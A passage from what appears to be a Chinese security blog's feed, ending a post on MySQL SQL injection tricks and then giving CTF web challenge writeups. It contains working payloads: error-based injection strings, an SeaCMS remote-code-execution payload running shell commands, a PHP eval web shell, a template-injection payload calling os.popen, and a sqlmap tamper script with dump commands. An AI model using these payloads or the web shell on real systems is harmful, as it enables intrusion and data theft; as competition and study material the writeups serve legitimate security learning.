mysql=&lt;5.5.53时才可以使用，不然不会有返回结果的</p><p>比如我在5.6.x下进行测试就没有返回结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select exp(~(select*from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select #)))&apos;</span><br></pre></td></tr></table></figure><p>如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的。</p><p>通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27 and (/*!00000select exp(~(/*!00000select*/ * from (/*!00000select*/ version())a)))%23</span><br></pre></td></tr></table></figure><p>参考:<a href="https://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/articles/5509124.html</a></p><h3 id="5-主键重复"><a href="#5-主键重复" class="headerlink" title="5.主键重复"></a>5.主键重复</h3><p>concat+rand()+group_by()导致主键重复</p><p>。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;10.1.36-MariaDB1&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure></p><p>floor(rand(0)<em>2)则会固定得到011011…的序列,在查询时floor(rand(0)</em>2)会被计算5次，查询原始数据表3次，所以表中需要至少3条数据才能报错。</p><h3 id="6-几何函数"><a href="#6-几何函数" class="headerlink" title="6.几何函数"></a>6.几何函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()</span><br></pre></td></tr></table></figure><p>这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行。</p><h3 id="7-join报错爆字段"><a href="#7-join报错爆字段" class="headerlink" title="7.join报错爆字段"></a>7.join报错爆字段</h3><p>注：该方法在知道表名的情况下使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from 表名 a join 表名 b) c)  </span><br><span class="line">在得到一个字段后，使用using得到下一个字段</span><br><span class="line">select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段)) c</span><br></pre></td></tr></table></figure><h2 id="0x15-MySQL快速盲注小技巧"><a href="#0x15-MySQL快速盲注小技巧" class="headerlink" title="0x15 MySQL快速盲注小技巧"></a>0x15 MySQL快速盲注小技巧</h2><p>将字符串经过hex编码之后，再转成10进制数字，通过盲注获取具体的数字，然后再将它还原回去。</p><p>注意当数字过长是可以采用截取字符串的方式，八位八位的获取数据结果，公式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);</span><br></pre></td></tr></table></figure><p>参考：<a href="http://www.zhutougg.com/2018/02/23/mysqlkuai-su-mang-zhu-xiao-ji-qiao/" target="_blank" rel="noopener">http://www.zhutougg.com/2018/02/23/mysqlkuai-su-mang-zhu-xiao-ji-qiao/</a></p><h2 id="0x16-update注入"><a href="#0x16-update注入" class="headerlink" title="0x16 update注入"></a>0x16 update注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$link = mysqli_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">mysqli_select_db($link, <span class="string">'code'</span>);</span><br><span class="line"></span><br><span class="line">$table = addslashes($_GET[<span class="string">'table'</span>]);</span><br><span class="line">$sql = <span class="string">"UPDATE `&#123;$table&#125;` </span></span><br><span class="line"><span class="string">        SET `username`='admin'</span></span><br><span class="line"><span class="string">        WHERE id=1"</span>;</span><br><span class="line"><span class="keyword">if</span>(!mysqli_query($link, $sql)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(mysqli_error($link));</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($link);</span><br></pre></td></tr></table></figure><p>关键点:</p><ol><li>update注入，且sql语句没有写在一行代码里面 =&gt; left join</li><li>addslashes在单引号和双引号前加”\” =&gt; 出现单引号的地方用char函数代替</li><li>闭合`</li><li>除了table表以外不知道数据库的其他表了，或者根本就只有一个表，所以我就要用mysql的虚表dual</li></ol><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=test` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select version()),0x7e)))) tt on tt.user=`t.username</span><br></pre></td></tr></table></figure><p>参考：<a href="https://paper.seebug.org/216/" target="_blank" rel="noopener">https://paper.seebug.org/216/</a></p><h2 id="0x17-00截断"><a href="#0x17-00截断" class="headerlink" title="0x17 %00截断"></a>0x17 %00截断</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$db  = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'web_brave'</span>,<span class="string">''</span>,<span class="string">'web_brave'</span>);</span><br><span class="line"></span><br><span class="line">$id  = @$_GET[<span class="string">'id'</span>];</span><br><span class="line">$key = $db-&gt;real_escape_string(@$_GET[<span class="string">'key'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\s|[\(\)\'"\/\\=&amp;\|1-9]|#|\/\*|into|file|case|group|order|having|limit|and|or|not|null|union|select|from|where|--/i'</span>, $id))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Attack Detected. Try harder: '</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]); <span class="comment">// attack detected</span></span><br><span class="line"></span><br><span class="line">$query = <span class="string">"SELECT `id`,`name`,`key` FROM `users` WHERE `id` = $id AND `key` = '"</span>.$key.<span class="string">"'"</span>;</span><br><span class="line">$q = $db-&gt;query($query);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($q-&gt;num_rows) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;h3&gt;Users:&lt;/h3&gt;&lt;ul&gt;'</span>;</span><br><span class="line">    <span class="keyword">while</span>($row = $q-&gt;fetch_array()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;li&gt;'</span>.$row[<span class="string">'name'</span>].<span class="string">'&lt;/li&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/ul&gt;'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;h3&gt;Nop.&lt;/h3&gt;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了好多但是”`”没有过滤，使用%00截断进行截断</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=`id`;%00</span><br></pre></td></tr></table></figure><h2 id="0x18-绕正则"><a href="#0x18-绕正则" class="headerlink" title="0x18 绕正则"></a>0x18 绕正则</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'id'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/'(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'id'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from xxx where id = '&#123;$_GET['id']&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">$result = sql_query($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个题目绕正则没什么意思，主要是想再提一下<code>$_REQUEST</code>变量覆盖问题</p><p>数据加载的顺序:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Environment-&gt;Get-&gt;Post-&gt;Cookie-&gt;Server</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET传参</span><br><span class="line">?id=1&apos; union select * from flag %23</span><br><span class="line">同时POST传参</span><br><span class="line">id=1</span><br></pre></td></tr></table></figure><h2 id="00-参考文章"><a href="#00-参考文章" class="headerlink" title="00.参考文章"></a>00.参考文章</h2><p><a href="https://www.cnblogs.com/REscan/p/7043705.html" target="_blank" rel="noopener">ctf中sql注入下的一些小技巧</a></p><p><a href="https://xz.aliyun.com/t/253#toc-0" target="_blank" rel="noopener">MYSQL报错注入的一点总结</a></p><p><a href="https://klionsec.github.io/2016/05/13/mysql-error-injection/" target="_blank" rel="noopener">sql注入入门 之 mysql 显错注入 [ floor()显错 ]</a></p><p><a href="http://www.zhutougg.com/2017/01/16/mysqlshu-ju-ku-de-12chong-bao-cuo-zhu-ru/" target="_blank" rel="noopener">MySQL数据库的12种爆错注入</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-http头xff的时间盲注&quot;&gt;&lt;a href=&quot;#0x01-http头xff的时间盲注&quot; class=&quot;headerlink&quot; title=&quot;0x01 http头xff的时间盲注&quot;&gt;&lt;/a&gt;0x01 http头xff的时间盲注&lt;/h2&gt;&lt;p&gt;题目代码如下
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>湖南省第二届大学生网络安全技能竞赛初赛实践重赛-Web</title>
    <link href="http://zer0yu.github.io/2018/11/23/2018-The-Second-HNCyber-Web-writeup/"/>
    <id>http://zer0yu.github.io/2018/11/23/2018-The-Second-HNCyber-Web-writeup/</id>
    <published>2018-11-23T12:33:42.000Z</published>
    <updated>2018-11-23T12:34:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-code-audit"><a href="#0x01-code-audit" class="headerlink" title="0x01 code audit"></a>0x01 code audit</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h3><p>101.71.29.5:10039</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析:"></a>题目分析:</h3><p>有登陆功能但是没有注册功能，所以要么sqli要么爆破密码，最终爆破得到弱口令进入后台。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure><p>Backup有提示源码文件和flag文件在服务器上的位置</p><p>审计源码，发现其实是CVE-2018-14421的简化版本，使用如下payload来构成rce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zeroyu</span><br><span class="line">&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][zeroyu]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][cool]);die();//&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure><p>注意一点这个id的值是要看响应包的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10039//web/index.php?r=content%2Fshow&amp;id=8&amp;zeroyu=system&amp;cool=cat%20/tmp/flag</span><br></pre></td></tr></table></figure></p><p>最后读取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;65bb1dd503d2a682b47fde40571598f4&#125;</span><br></pre></td></tr></table></figure></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>1.这篇文章是从payload出发来分析触发点的，很具有借鉴意义–&gt;<br><a href="https://www.anquanke.com/post/id/152764" target="_blank" rel="noopener">CVE-2018-14421——Seacms后台getshell分析</a></p><p>文章中提到一点</p><blockquote><p>htm文件在开发中就只是模板文件，需要有控制器来渲染，渲染一般都是有include，render，render_template等等代码关键词，所以我们可以通过这个来确定控制器。</p></blockquote><p>2.<a href="https://www.anquanke.com/post/id/153402" target="_blank" rel="noopener">seacms v6.61 审计深入思考</a></p><h2 id="0x02-upload"><a href="#0x02-upload" class="headerlink" title="0x02 upload"></a>0x02 upload</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述:"></a>题目描述:</h3><p><a href="http://101.71.29.5:10031/index.php" target="_blank" rel="noopener">http://101.71.29.5:10031/index.php</a></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析:"></a>题目分析:</h3><p>1.上传php文件–&gt;上传失败并提示It is not a image</p><p>2.burp抓包并修改Content-Type: image/jpeg和文件后缀名–&gt;依旧上传失败</p><p>3.猜测可能是判断了文件的格式，比如文件头什么的，所以我在图片里藏了一段PHP代码进行上传–&gt;成功上传，但是无法解析</p><p>4.目标是Apache机器，进而构造<code>mu.jpg.php</code>后缀名进行上传–&gt;上传成功并且成功解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&apos;pass&apos;]) ?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://i.loli.net/2018/11/23/5bf7f2e0069aa.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/23/5bf7f2e0069aa.png" alt="屏幕快照 2018-11-23 下午1.52.01.png"></a></p><p>5.使用cknife进行连接并找到flag<br><a href="https://i.loli.net/2018/11/23/5bf7f2df1c527.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/23/5bf7f2df1c527.png" alt="屏幕快照 2018-11-23 下午1.51.46.png"></a></p><h2 id="0x03-高级渗透测试"><a href="#0x03-高级渗透测试" class="headerlink" title="0x03 高级渗透测试"></a>0x03 高级渗透测试</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述:"></a>题目描述:</h3><p><a href="http://101.71.29.5:10050/" target="_blank" rel="noopener">http://101.71.29.5:10050/</a></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析:"></a>题目分析:</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-code-audit&quot;&gt;&lt;a href=&quot;#0x01-code-audit&quot; class=&quot;headerlink&quot; title=&quot;0x01 code audit&quot;&gt;&lt;/a&gt;0x01 code audit&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2018-湖湘杯-Web</title>
    <link href="http://zer0yu.github.io/2018/11/19/2018-hxb-Web-writeup/"/>
    <id>http://zer0yu.github.io/2018/11/19/2018-hxb-Web-writeup/</id>
    <published>2018-11-19T00:35:06.000Z</published>
    <updated>2018-11-19T00:36:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB-XmeO"><a href="#WEB-XmeO" class="headerlink" title="WEB  XmeO"></a>WEB  XmeO</h2><p>题目解析:</p><p>是一个ssti类型漏洞</p><p>playload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>].popen(<span class="string">'ls'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>参考:</p><p>之前一直也是被搅屎，后来下线了没管，结果最后5分钟他又上线了。。。5分钟里还挂了3分钟，没翻到flag，打扰了。</p><p><a href="https://www.jianshu.com/p/6e4aebd18660" target="_blank" rel="noopener">https://www.jianshu.com/p/6e4aebd18660</a></p><p><a href="http://www.cnblogs.com/tyomcat/p/5440488.html" target="_blank" rel="noopener">http://www.cnblogs.com/tyomcat/p/5440488.html</a></p><p><a href="https://www.freebuf.com/articles/web/133336.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/133336.html</a></p><h2 id="WEB-Code-Check"><a href="#WEB-Code-Check" class="headerlink" title="WEB  Code Check"></a>WEB  Code Check</h2><p>题目解析:</p><p>目录遍历得到源码(我说我之前是百度+猜解得到加解密算法的你敢信)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.108.176.234:49882/news/</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../config.php'</span>;</span><br><span class="line"><span class="comment">//解密过程</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</span><br><span class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</span><br><span class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</span><br><span class="line">mcrypt_generic_deinit($td);</span><br><span class="line">mcrypt_module_close($td);</span><br><span class="line"><span class="keyword">if</span>(substr(trim($data),<span class="number">-7</span>)!==<span class="string">'hxb2018'</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> substr(trim($data),<span class="number">0</span>,strlen(trim($data))<span class="number">-7</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$id=decode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql=<span class="string">"select id,title,content,time from notice where id=$id"</span>;</span><br><span class="line">$info=$link-&gt;query($sql);</span><br><span class="line">$arr=$info-&gt;fetch_assoc();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;X公司HR系统V1<span class="number">.0</span>&lt;/title&gt;</span><br><span class="line">&lt;style&gt;.body&#123;width:<span class="number">600</span>px;height:<span class="number">500</span>px;margin:<span class="number">0</span> auto&#125;.title&#123;color:red;height:<span class="number">60</span>px;line-height:<span class="number">60</span>px;font-size:<span class="number">30</span>px;font-weight:<span class="number">700</span>;margin-top:<span class="number">75</span>pt;border-bottom:<span class="number">2</span>px solid red;text-align:center&#125;.content,.title&#123;margin:<span class="number">0</span> auto;width:<span class="number">600</span>px;display:block&#125;.content&#123;height:<span class="number">30</span>px;line-height:<span class="number">30</span>px;font-size:<span class="number">18</span>px;margin-top:<span class="number">40</span>px;text-align:left;color:<span class="comment">#828282&#125;&lt;/style&gt;</span></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="body"&gt;</span><br><span class="line">&lt;div class="title"&gt;&lt;?php echo $arr['title']?&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class="content"&gt;&lt;?php echo $arr['content']?&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>使用<code>dirsearch</code>扫描还发现了phpinfo页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.108.176.234:49882/0.php</span><br></pre></td></tr></table></figure></p><p>依据解密过程写出加密过程<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// header('content-type:text/html;charset=utf-8');</span></span><br><span class="line"><span class="comment">// require_once '../config.php';</span></span><br><span class="line"><span class="comment">//解密过程</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128, <span class="string">''</span>, MCRYPT_MODE_CBC, <span class="string">''</span>);</span><br><span class="line">    mcrypt_generic_init($td, <span class="string">'ydhaqPQnexoaDuW3'</span>, <span class="string">'2018201920202021'</span>);</span><br><span class="line">    $data = mdecrypt_generic($td, base64_decode(base64_decode($data)));</span><br><span class="line">    mcrypt_generic_deinit($td);</span><br><span class="line">    mcrypt_module_close($td);</span><br><span class="line">    <span class="keyword">if</span> (substr(trim($data), <span class="number">-7</span>) !== <span class="string">'hxb2018'</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//        var_dump($data);</span></span><br><span class="line">        <span class="keyword">return</span> substr(trim($data), <span class="number">0</span>, strlen(trim($data)) - <span class="number">7</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</span><br><span class="line">    mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</span><br><span class="line">    $data = mcrypt_generic($td,$data);</span><br><span class="line">    mcrypt_generic_deinit($td);</span><br><span class="line">    mcrypt_module_close($td);</span><br><span class="line">    $data = base64_encode(base64_encode($data));</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$id = decode(<span class="string">"b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09"</span>);</span><br><span class="line"><span class="comment">//echo $id;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$deid=encode("2hxb2018");</span></span><br><span class="line">$enid=$_GET[<span class="string">'enid'</span>].<span class="string">"hxb2018"</span>;</span><br><span class="line">$deid=encode($enid);</span><br><span class="line"><span class="comment">//$id = decode($deid);</span></span><br><span class="line"><span class="keyword">echo</span> $deid;</span><br></pre></td></tr></table></figure></p><p>我将加密算法放在了本地服务器上然后写了一个sqlmap的tamper去进行注入。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file 'doc/COPYING' for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        enurl=<span class="string">"http://localhost/footest/test.php?enid=&#123;&#125;"</span>.format(payload)</span><br><span class="line">        enpayload=requests.get(enurl)</span><br><span class="line">        <span class="keyword">return</span> enpayload.content</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload</span><br></pre></td></tr></table></figure></p><p>payload如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u<span class="string">"http://39.108.176.234:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09"</span> --tamper 23333 -D <span class="string">"mozhe_discuz_stormgroup"</span> -T <span class="string">"notice2"</span> -C <span class="string">"title"</span> --dump</span><br></pre></td></tr></table></figure></p><p>注入得到的数据如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: mozhe_discuz_stormgroup</span><br><span class="line">Table: notice2</span><br><span class="line">[1 entry]</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| title                                     |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| hxb2018&#123;14ef3bd9a833a50b7ae24bbb0e4d57c8&#125; |</span><br><span class="line">+-------------------------------------------+</span><br></pre></td></tr></table></figure></p><p>参考:</p><p>就是依据这个链接猜到源码的大概</p><p><a href="http://cpsliang.com/archives/634" target="_blank" rel="noopener">http://cpsliang.com/archives/634</a></p><h2 id="WEB-Readflag"><a href="#WEB-Readflag" class="headerlink" title="WEB  Readflag"></a>WEB  Readflag</h2><p>题目描述:</p><p>来骗我的flag呀~</p><p>47.107.145.220:80</p><p>解题分析:</p><p>burp的intrude fuzz常见配置文件路径，得到配置文件<br><figure class="highlight plain"><table><tr><td 